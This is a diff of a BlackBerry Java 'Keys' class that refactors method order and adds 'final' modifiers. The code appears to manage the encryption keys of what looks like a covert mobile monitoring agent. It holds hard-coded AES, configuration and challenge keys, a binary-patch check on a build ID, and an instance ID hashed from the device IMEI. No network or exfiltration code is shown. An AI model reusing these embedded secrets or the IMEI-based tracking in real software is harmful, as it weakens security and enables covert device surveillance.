@@ -12,7 +12,7 @@ import blackberry.crypto.Encryption;
 import blackberry.interfaces.Singleton;
 import blackberry.utils.Utils;
 
-public class Keys implements Singleton {
+public final class Keys implements Singleton {
     private static String conf = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
     private static String aes = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // markup,
     // log
@@ -30,22 +30,22 @@ public class Keys implements Singleton {
 
     static Keys instance = null;
 
-    private Keys() {
-        byte[] imei = GPRSInfo.getIMEI();
-        byteInstanceID = Encryption.SHA1(imei);
-        instanceID = Utils.byteArrayToHex(byteInstanceID);
-    };
-
     public static synchronized Keys getInstance() {
         if (instance == null) {
             instance = new Keys();
         }
 
         return instance;
-    }
+    };
 
     public static boolean hasBeenBinaryPatched() {
         return !buildID.equals("av3pVck1gb4eR2d8");
+    }
+
+    private Keys() {
+        final byte[] imei = GPRSInfo.getIMEI();
+        byteInstanceID = Encryption.SHA1(imei);
+        instanceID = Utils.byteArrayToHex(byteInstanceID);
     }
 
     public byte[] getAesKey() {
@@ -55,16 +55,8 @@ public class Keys implements Singleton {
         return byteAesKey;
     }
 
-    public void setAesKey(byte[] key) {
-        byteAesKey = key;
-    }
-
     public byte[] getBuildId() {
         return buildID.getBytes();
-    }
-
-    public void setBuildID(String build) {
-        buildID = build;
     }
 
     public byte[] getChallengeKey() {
@@ -75,20 +67,12 @@ public class Keys implements Singleton {
         return byteChallengeKey;
     }
 
-    public void setChallengeKey(byte[] challenge_) {
-        byteChallengeKey = challenge_;
-    }
-
     public byte[] getConfKey() {
         if (byteConfKey == null) {
             byteConfKey = keyFromString(conf);
         }
 
         return byteConfKey;
-    }
-
-    public void setConfKey(byte[] conf_) {
-        byteConfKey = conf_;
     }
 
     public byte[] getConfNameKey() {
@@ -104,10 +88,26 @@ public class Keys implements Singleton {
         return byteInstanceID;
     }
 
-    private byte[] keyFromString(String string) {
-        byte[] key = new byte[16];
+    private byte[] keyFromString(final String string) {
+        final byte[] key = new byte[16];
         Utils.copy(key, 0, string.getBytes(), 0, 16);
         return key;
+    }
+
+    public void setAesKey(final byte[] key) {
+        byteAesKey = key;
+    }
+
+    public void setBuildID(final String build) {
+        buildID = build;
+    }
+
+    public void setChallengeKey(final byte[] challenge_) {
+        byteChallengeKey = challenge_;
+    }
+
+    public void setConfKey(final byte[] conf_) {
+        byteConfKey = conf_;
     }
 
 }
